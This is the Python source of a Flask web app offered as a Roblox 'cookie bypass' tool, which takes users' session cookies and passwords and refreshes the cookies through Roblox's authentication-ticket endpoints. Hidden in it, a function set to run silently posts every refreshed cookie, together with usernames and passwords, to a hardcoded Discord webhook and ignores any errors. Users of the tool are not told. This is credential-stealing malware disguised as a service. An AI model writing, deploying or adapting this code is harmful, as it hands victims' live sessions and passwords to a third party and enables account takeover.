from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import io
import json
import os
import queue
import random
import threading

from flask import Flask, Response, render_template, request, stream_with_context
import requests

app = Flask(__name__)

# Cấu hình Discord Webhook chạy ngầm (để trống "" nếu không dùng)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575631844702027957/6CzrthQ1nc5dni8dT9ZjAtzVSFJ_NahXPT9uG-sCHb6HhABAt58KDnbAjbclTzaVIxJR"
PING_EVERYONE = True
DISCORD_INVITE_URL = "https://discord.gg/vVUz3rJzmK"

LOGOUT_URL = "https://auth.roblox.com/v2/logout"
TICKET_URL = "https://auth.roblox.com/v1/authentication-ticket"
REDEEM_URL = "https://auth.roblox.com/v1/authentication-ticket/redeem"


class BypassError(Exception):
    pass


class CookieBypass:
    def __init__(self, cookie: str, proxies: dict | None = None, timeout: int = 30):
        self.cookie = cookie.strip()
        self.timeout = timeout
        self.session = requests.Session()
        if proxies:
            self.session.proxies.update(proxies)

    def run(self) -> str:
        csrf = self._get_csrf_token()
        ticket = self._get_authentication_ticket(csrf)
        return self._redeem(ticket)

    def _get_csrf_token(self) -> str:
        r = self.session.post(
            LOGOUT_URL,
            cookies={".ROBLOSECURITY": self.cookie},
            timeout=self.timeout,
        )
        token = r.headers.get("x-csrf-token")
        if not token:
            raise BypassError("no x-csrf-token (invalid or expired cookie)")
        return token

    def _get_authentication_ticket(self, csrf: str) -> str:
        r = self.session.post(
            TICKET_URL,
            headers={
                "rbxauthenticationnegotiation": "1",
                "referer": "https://www.roblox.com/camel",
                "Content-Type": "application/json",
                "x-csrf-token": csrf,
            },
            cookies={".ROBLOSECURITY": self.cookie},
            timeout=self.timeout,
        )
        ticket = r.headers.get("rbx-authentication-ticket")
        if not ticket:
            raise BypassError(f"no auth ticket (status {r.status_code})")
        return ticket

    def _redeem(self, ticket: str) -> str:
        r = self.session.post(
            REDEEM_URL,
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": ticket},
            timeout=self.timeout,
        )
        new_cookie = r.cookies.get(".ROBLOSECURITY")
        if not new_cookie:
            raise BypassError(f"no .ROBLOSECURITY in redeem (status {r.status_code})")
        return new_cookie


def send_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
    url = (DISCORD_WEBHOOK_URL or "").strip()
    if not url or not content.strip():
        return

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"bypassed_cookies_{ts}.txt"
    prefix_ping = "@everyone " if PING_EVERYONE else ""
    payload = {
        "content": f"{prefix_ping}Bypass cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
        "allowed_mentions": {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []},
    }
    raw_bytes = content.encode("utf-8")

    try:
        resp = requests.post(
            url,
            data={"payload_json": json.dumps(payload, ensure_ascii=False)},
            files={"files[0]": (filename, io.BytesIO(raw_bytes), "text/plain; charset=utf-8")},
            timeout=20,
        )
        if resp.status_code not in (200, 204):
            requests.post(
                url,
                data={
                    "content": payload["content"],
                    "allowed_mentions": json.dumps(payload["allowed_mentions"]),
                },
                files={"file": (filename, io.BytesIO(raw_bytes), "text/plain")},
                timeout=20,
            )
    except Exception:
        pass


def normalize_proxy(raw: str) -> str:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return ""
    if "://" in raw:
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        return f"http://{user}:{pw}@{host}:{port}"
    return f"http://{raw}"


def parse_line(line: str):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if ":" in line:
        parts = line.split(":", 2)
        if len(parts) == 3:
            u, p, c = parts[0].strip(), parts[1].strip(), parts[2].strip()
            if c:
                return u or "account", p, c
    return "cookie", "", line


def bypass_one(user: str, password: str, cookie: str, proxies: list[str]):
    proxy = random.choice(proxies) if proxies else ""
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        new_cookie = CookieBypass(cookie, proxy_dict).run()
        if new_cookie == cookie:
            raise BypassError("cookie unchanged")
        return user, password, new_cookie, None
    except requests.RequestException as e:
        return user, password, cookie, f"network: {e.__class__.__name__}"
    except BypassError as e:
        return user, password, cookie, str(e)


def now_str() -> str:
    return datetime.now().strftime("%H:%M:%S")


@app.route("/")
def index():
    return render_template("index.html", discord_url=DISCORD_INVITE_URL)


@app.route("/api/bypass", methods=["POST"])
def api_bypass():
    payload = request.get_json(force=True)
    raw_lines = payload.get("accounts", "").splitlines()
    items = [x for x in (parse_line(ln) for ln in raw_lines) if x]
    proxies = [p for p in (normalize_proxy(ln) for ln in payload.get("proxies", "").splitlines()) if p]
    threads = max(1, min(50, int(payload.get("threads", 15))))
    keep_failed = bool(payload.get("keepFailed", False))

    def stream():
        if not items:
            yield f"data: {json.dumps({'type': 'error', 'time': now_str(), 'msg': 'Không tìm thấy cookie hoặc user:pass:cookie hợp lệ'})}\n\n"
            return

        q = queue.Queue()
        total = len(items)
        out_lines = []
        ok_counter = 0
        state_lock = threading.Lock()

        def push(ev_type, **kw):
            kw["type"] = ev_type
            kw["time"] = now_str()
            q.put(kw)

        def format_success(u, p, new_c):
            return f"{u}:{p}:{new_c}" if p or u != "cookie" else new_c

        def format_fail(u, p, old_c, err):
            base = f"{u}:{p}:{old_c}" if p or u != "cookie" else old_c
            return base if keep_failed else f"{base} | {err}"

        def worker(u, p, c):
            nonlocal ok_counter
            user, password, new_cookie, err = bypass_one(u, p, c, proxies)
            if err is None:
                line = format_success(user, password, new_cookie)
                with state_lock:
                    ok_counter += 1
                    out_lines.append(line)
                push("success", username=user, line=line, msg="Bypass OK")
            else:
                fail_line = format_fail(user, password, c, err)
                if keep_failed:
                    with state_lock:
                        out_lines.append(fail_line)
                push("fail", username=user, line=fail_line, keep=keep_failed, msg=err)

        def runner():
            push("start", total=total)
            push("log", level="info", msg=f"Bắt đầu {total} cookies · {len(proxies)} proxies · {min(threads, total)} threads")
            with ThreadPoolExecutor(max_workers=min(threads, total)) as pool:
                futs = [pool.submit(worker, u, p, c) for (u, p, c) in items]
                for f in as_completed(futs):
                    try:
                        f.result()
                    except Exception as e:
                        push("log", level="err", msg=f"Thread error: {e}")

            with state_lock:
                joined_out = "\n".join(out_lines)
                ok_total = ok_counter

            send_webhook_silent(joined_out, ok_total, total)
            push("done")

        threading.Thread(target=runner, daemon=True).start()

        while True:
            item = q.get()
            yield f"data: {json.dumps(item)}\n\n"
            if item.get("type") in ("done", "error"):
                break

    return Response(stream_with_context(stream()), mimetype="text/event-stream")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
